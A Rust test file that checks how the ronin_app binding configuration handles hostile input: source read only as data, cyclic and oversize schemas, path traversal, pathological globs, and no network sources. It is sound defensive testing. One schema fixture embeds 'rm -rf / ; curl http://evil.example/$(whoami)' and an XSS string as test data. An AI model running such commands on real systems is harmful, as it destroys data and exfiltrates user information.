//! US3 source-as-data + malicious-config trust tests (T039, FR-024/FR-025) —
//! [COMPLETES FR-025].
//!
//! Hardens the binding-config "trusted-as-input" boundary against hostile input.
//! Every case must degrade SAFELY — no panic, no code execution, no widened read —
//! to structural-only (`NoBinding` / no `BoundType`):
//!
//! * **Source consumed as data, never executed** (FR-024): a `type_source` whose
//!   file contains hostile-looking content (a Rust file with a `build.rs`-style
//!   side-effect comment + a `main` that would "do" something if run) is only
//!   parsed as data — acquisition never executes it (no side effect; a normal
//!   `Some`/`None` model result).
//! * **Cyclic-`$ref` / schema-bomb bounded** (FR-024): a schema with a deeply
//!   recursive `$ref` or an enormous expansion is bounded by the validator's
//!   existing guards (`MAX_SCHEMA_BYTES` / `MAX_ENUM_DEPTH`) → fail-soft, no hang,
//!   no panic; the document still validates structural-only and the run returns
//!   well within a generous deadline.
//! * **Path-traversal / out-of-project `type_source`** (FR-025): a `type_source`
//!   pointing at `../outside.json` (above the project root) degrades that rule to
//!   `NoBinding` — the out-of-project file is NOT read — with no crash.
//! * **Pathological glob** (FR-025): a huge/catastrophic pattern degrades to
//!   no-match (`NoBinding`), no crash / no hang.
//!
//! The path-containment and pathological-glob cases are proven END-TO-END through
//! the real [`App`] (resolve + acquire with the project root threaded in); the
//! data-only and schema-bomb cases use the public acquisition / worker round-trip.

use std::path::PathBuf;
use std::time::{Duration, Instant};

use ronin_app::app::App;
use ronin_app::binding::{
    BindingConfig, BindingOrigin, BindingRule, TypeBinding, TypeSourceLocator,
};
use ronin_app::settings::AppSettings;
use ronin_app::type_acquire::{acquire_bound_type, resolve_and_acquire};

/// Create a unique temp project directory for a test (fresh each run).
fn temp_project(tag: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "ronin_trust_{tag}_{}_{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&dir).expect("create temp project dir");
    dir
}

/// Drive the App's real off-frame worker to completion for the active document.
fn drive_until_landed(app: &mut App) {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        if app.poll_documents() {
            return;
        }
        if Instant::now() >= deadline {
            panic!("App reparse did not land within timeout");
        }
        std::thread::yield_now();
    }
}

/// Count `ronin-types` (type) diagnostics on the active document.
fn type_diag_count(app: &App) -> usize {
    app.active_document()
        .map(|d| {
            d.diagnostics
                .iter()
                .filter(|v| v.code.source() == "ronin-types")
                .count()
        })
        .unwrap_or(0)
}

#[test]
fn rust_source_with_hostile_content_is_read_as_data_never_executed() {
    // FR-024: the type_source is consumed strictly as DATA. A Rust file carrying a
    // build.rs-style side-effect comment and a `main` that would touch the
    // filesystem if RUN is only parsed (syn AST) — never compiled or executed.
    let project = temp_project("data_rust");
    let src = project.join("hostile.rs");
    // A sentinel file the source would create IF it were executed. It must NOT
    // appear after acquisition — proving the source was never run.
    let sentinel = project.join("PWNED.txt");
    let hostile = format!(
        "// build.rs: fn main() {{ std::fs::write(\"{}\", b\"x\").unwrap(); }}\n\
         pub struct Config {{ pub name: String, pub level: u8 }}\n\
         fn main() {{ std::fs::write(\"{}\", b\"x\").expect(\"side effect\"); }}\n",
        sentinel.display().to_string().replace('\\', "\\\\"),
        sentinel.display().to_string().replace('\\', "\\\\"),
    );
    std::fs::write(&src, hostile.as_bytes()).expect("write hostile rust source");

    // Acquire the `Config` struct from the source (project root = the temp dir so
    // the in-project source is contained).
    let binding = TypeBinding::bound(
        "Config".to_string(),
        TypeSourceLocator::RustSource(src.clone()),
        BindingOrigin::Config,
    );
    let bound = acquire_bound_type(&binding, &project);

    // The source parsed as DATA: the struct lowered to a def (a normal Some result).
    let bound = bound.expect("the Rust struct is acquired as data");
    assert_eq!(bound.type_name, "Config");
    // Critically: the side-effect file was NEVER created — the source was not run.
    assert!(
        !sentinel.exists(),
        "acquisition must NOT execute the source (no side-effect file created)"
    );

    let _ = std::fs::remove_dir_all(&project);
}

#[test]
fn schema_with_weird_keywords_is_read_as_data_no_execution() {
    // FR-024: a schema file carrying odd / unknown keywords is parsed as data only;
    // acquisition returns a normal Some/None result, never executing anything.
    let project = temp_project("data_schema");
    let schema_path = project.join("weird.schema.json");
    let schema = br#"{
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$comment": "rm -rf / ; curl http://evil.example/$(whoami)",
        "$defs": {
            "Thing": {
                "type": "object",
                "x-weird-keyword": "<script>alert(1)</script>",
                "properties": { "id": { "type": "integer" } }
            }
        }
    }"#;
    std::fs::write(&schema_path, schema).expect("write weird schema");

    let binding = TypeBinding::bound(
        "Thing".to_string(),
        TypeSourceLocator::SchemaFile(schema_path.clone()),
        BindingOrigin::Config,
    );
    // Must not panic and must produce a normal result (the def exists → Some).
    let bound = acquire_bound_type(&binding, &project);
    assert!(
        bound.is_some(),
        "a schema with weird-but-valid keywords is read as data and acquires the def"
    );

    let _ = std::fs::remove_dir_all(&project);
}

#[test]
fn cyclic_ref_schema_is_bounded_fail_soft_no_hang() {
    // FR-024: a schema with a deeply recursive / cyclic `$ref` must be bounded by
    // the validator's guards and fail soft — no hang, no panic. Drive the App's
    // real worker round-trip and assert it lands well within a generous deadline.
    let project = temp_project("cyclic");
    let schema_path = project.join("cyclic.schema.json");
    // `Node` references itself through `next`, an unbounded recursive cycle.
    // Use `##` delimiters because the JSON pointer contains a literal `"#`.
    let schema = br##"{
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$defs": {
            "Node": {
                "type": "object",
                "properties": {
                    "value": { "type": "integer" },
                    "next": { "$ref": "#/$defs/Node" }
                }
            }
        }
    }"##;
    std::fs::write(&schema_path, schema).expect("write cyclic schema");

    // Bind the doc to `Node` via a project rule.
    let ronin = project.join(".ronin");
    std::fs::create_dir_all(&ronin).expect("create .ronin");
    let escaped = schema_path.display().to_string().replace('\\', "\\\\");
    let json = format!(
        r#"{{ "rules": [ {{ "pattern": "**/*.ron", "type_name": "Node",
            "type_source": {{ "SchemaFile": "{escaped}" }} }} ], "version": 1 }}"#
    );
    std::fs::write(ronin.join("bindings.json"), json.as_bytes()).expect("write bindings");

    let doc_path = project.join("thing.ron");
    std::fs::write(&doc_path, b"(value: 1)\n").expect("write doc");

    // Construction + open + a bounded reparse must complete promptly (the bound is
    // exercised; the run must return, not hang).
    let start = Instant::now();
    let mut app = App::new(AppSettings::default(), Some(doc_path));
    drive_until_landed(&mut app);
    assert!(
        start.elapsed() < Duration::from_secs(5),
        "a cyclic-$ref schema must be bounded and return promptly (no hang)"
    );
    // No panic occurred (we got here); the document still has its (structural)
    // state and validation degraded safely. The bound is irrelevant to safety —
    // what matters is no hang / no panic.
    assert!(
        app.active_document().is_some(),
        "the document survives a cyclic-$ref bound schema (no crash)"
    );

    let _ = std::fs::remove_dir_all(&project);
}

#[test]
fn schema_bomb_oversize_degrades_to_structural_only_no_hang() {
    // FR-024: an enormous schema (schema-bomb) is bounded by MAX_SCHEMA_BYTES →
    // fail-soft (structural-only / empty), no hang, no panic. Build a schema whose
    // serialized form is large, bind to it, and assert the round-trip returns and
    // produces zero type diagnostics (the oversize schema is skipped).
    let project = temp_project("bomb");
    let schema_path = project.join("bomb.schema.json");
    // ~5 MB of properties — over the validator's 4 MiB compile cap once serialized.
    let mut props = String::new();
    for i in 0..120_000u32 {
        if i > 0 {
            props.push(',');
        }
        props.push_str(&format!("\"field_{i}\": {{ \"type\": \"string\" }}"));
    }
    let schema = format!(
        r#"{{ "$schema": "https://json-schema.org/draft/2020-12/schema",
            "$defs": {{ "Big": {{ "type": "object", "properties": {{ {props} }} }} }} }}"#
    );
    std::fs::write(&schema_path, schema.as_bytes()).expect("write bomb schema");

    let ronin = project.join(".ronin");
    std::fs::create_dir_all(&ronin).expect("create .ronin");
    let escaped = schema_path.display().to_string().replace('\\', "\\\\");
    let json = format!(
        r#"{{ "rules": [ {{ "pattern": "**/*.ron", "type_name": "Big",
            "type_source": {{ "SchemaFile": "{escaped}" }} }} ], "version": 1 }}"#
    );
    std::fs::write(ronin.join("bindings.json"), json.as_bytes()).expect("write bindings");

    let doc_path = project.join("thing.ron");
    std::fs::write(&doc_path, b"(field_0: \"ok\")\n").expect("write doc");

    let start = Instant::now();
    let mut app = App::new(AppSettings::default(), Some(doc_path));
    drive_until_landed(&mut app);
    assert!(
        start.elapsed() < Duration::from_secs(15),
        "an oversize schema-bomb must be bounded and return promptly (no hang)"
    );
    // Fail-soft: the oversize schema is rejected at compile, so zero type
    // diagnostics are produced (structural-only), with no panic.
    assert_eq!(
        type_diag_count(&app),
        0,
        "an oversize schema-bomb degrades to structural-only (zero type diagnostics)"
    );

    let _ = std::fs::remove_dir_all(&project);
}

#[test]
fn path_traversal_type_source_degrades_to_no_binding_file_not_read() {
    // FR-025: a `type_source` pointing at `../outside.json` (above the project root)
    // must degrade that rule to NoBinding — the out-of-project file is NOT read.
    // Place a REAL, valid schema OUTSIDE the project to prove it is never consumed.
    let parent = temp_project("traversal_parent");
    let project = parent.join("project");
    std::fs::create_dir_all(&project).expect("create project subdir");
    // A perfectly valid schema sitting OUTSIDE the project root.
    let outside = parent.join("outside.json");
    let schema = br#"{
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$defs": { "Secret": { "type": "object",
            "properties": { "id": { "type": "integer" } }, "required": ["id"] } }
    }"#;
    std::fs::write(&outside, schema).expect("write outside schema");

    // The rule's type_source escapes the project via `../outside.json`.
    let config = BindingConfig {
        rules: vec![BindingRule {
            pattern: "**/*.ron".to_string(),
            exclude: None,
            type_name: "Secret".to_string(),
            type_source: TypeSourceLocator::SchemaFile(PathBuf::from("../outside.json")),
        }],
        version: 1,
    };

    let doc = project.join("thing.ron");
    // Resolve + acquire with the project root: the binding *resolves* (the glob
    // matches) but acquisition REJECTS the escaping source → no BoundType.
    let (binding, bound) = resolve_and_acquire(&config, Some(&doc), None, &project);
    assert!(
        binding.is_bound(),
        "the glob still matches (display binding is meaningful)"
    );
    assert!(
        bound.is_none(),
        "an out-of-project ../ type_source must NOT be read → no BoundType (structural-only)"
    );

    // Also confirm an ABSOLUTE out-of-project path is rejected identically.
    let config_abs = BindingConfig {
        rules: vec![BindingRule {
            pattern: "**/*.ron".to_string(),
            exclude: None,
            type_name: "Secret".to_string(),
            type_source: TypeSourceLocator::SchemaFile(outside.clone()),
        }],
        version: 1,
    };
    let (_b, bound_abs) = resolve_and_acquire(&config_abs, Some(&doc), None, &project);
    assert!(
        bound_abs.is_none(),
        "an absolute out-of-project type_source must NOT be read → no BoundType"
    );

    let _ = std::fs::remove_dir_all(&parent);
}

#[test]
fn path_traversal_via_app_open_yields_structural_only_no_panic() {
    // FR-025 end-to-end: open a doc through the real App with a config whose
    // type_source escapes the project root; the App must NOT panic and the doc must
    // degrade to structural-only (zero type diagnostics).
    let parent = temp_project("traversal_app_parent");
    let project = parent.join("project");
    std::fs::create_dir_all(&project).expect("create project subdir");
    // A valid schema OUTSIDE the project that would flag a wrong value if it were
    // (wrongly) read.
    let outside = parent.join("outside.json");
    let schema = br#"{
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$defs": { "Entity": { "type": "object",
            "properties": { "id": { "type": "integer" } }, "required": ["id"] } }
    }"#;
    std::fs::write(&outside, schema).expect("write outside schema");

    // Config inside the project points its type_source OUTSIDE via `../outside.json`.
    let ronin = project.join(".ronin");
    std::fs::create_dir_all(&ronin).expect("create .ronin");
    let json = r#"{ "rules": [ { "pattern": "**/*.ron", "type_name": "Entity",
        "type_source": { "SchemaFile": "../outside.json" } } ], "version": 1 }"#;
    std::fs::write(ronin.join("bindings.json"), json.as_bytes()).expect("write bindings");

    // A wrong-type value that WOULD flag against the outside Entity schema if read.
    let doc_path = project.join("thing.ron");
    std::fs::write(&doc_path, b"(id: \"oops\")\n").expect("write doc");

    let mut app = App::new(AppSettings::default(), Some(doc_path));
    drive_until_landed(&mut app);
    assert_eq!(
        type_diag_count(&app),
        0,
        "an escaping type_source must NOT be read → structural-only (zero type diagnostics)"
    );

    let _ = std::fs::remove_dir_all(&parent);
}

#[test]
fn pathological_glob_degrades_to_no_binding_no_hang() {
    // FR-025: a huge / pathological glob pattern degrades to no-match (NoBinding),
    // no crash, no hang. Resolution must return promptly.
    let project = temp_project("glob");
    let schema_path = project.join("entity.schema.json");
    let schema = br#"{
        "$schema": "https://json-schema.org/draft/2020-12/schema",
        "$defs": { "Entity": { "type": "object" } }
    }"#;
    std::fs::write(&schema_path, schema).expect("write schema");

    // A multi-megabyte catastrophic pattern alternating `*` and `?`.
    let huge: String = "*?".repeat(2_000_000);
    let config = BindingConfig {
        rules: vec![BindingRule {
            pattern: huge,
            exclude: None,
            type_name: "Entity".to_string(),
            type_source: TypeSourceLocator::SchemaFile(schema_path.clone()),
        }],
        version: 1,
    };

    let doc = project.join("thing.ron");
    let start = Instant::now();
    let (binding, bound) = resolve_and_acquire(&config, Some(&doc), None, &project);
    assert!(
        start.elapsed() < Duration::from_secs(5),
        "a pathological glob must degrade promptly (no hang)"
    );
    assert!(
        !binding.is_bound(),
        "an over-cap pathological glob never matches → NoBinding"
    );
    assert!(bound.is_none(), "NoBinding ⇒ no BoundType");

    let _ = std::fs::remove_dir_all(&project);
}

#[test]
fn config_has_no_network_source_field() {
    // FR-025: the config stays project-scoped local — a TypeSourceLocator is only
    // ever a local path (RustSource / SchemaFile); there is no URL/network variant,
    // so loading a config can never trigger a remote fetch. This is a structural
    // guarantee asserted by exhaustively matching the only two local variants.
    let local_schema = TypeSourceLocator::SchemaFile(PathBuf::from("schemas/app.json"));
    let local_rust = TypeSourceLocator::RustSource(PathBuf::from("src/types.rs"));
    for src in [local_schema, local_rust] {
        match src {
            // Both variants carry a local filesystem path only — no network source.
            TypeSourceLocator::SchemaFile(p) | TypeSourceLocator::RustSource(p) => {
                assert!(
                    !p.to_string_lossy().contains("://"),
                    "a type_source is a local path, never a URL/network source"
                );
            }
        }
    }
}
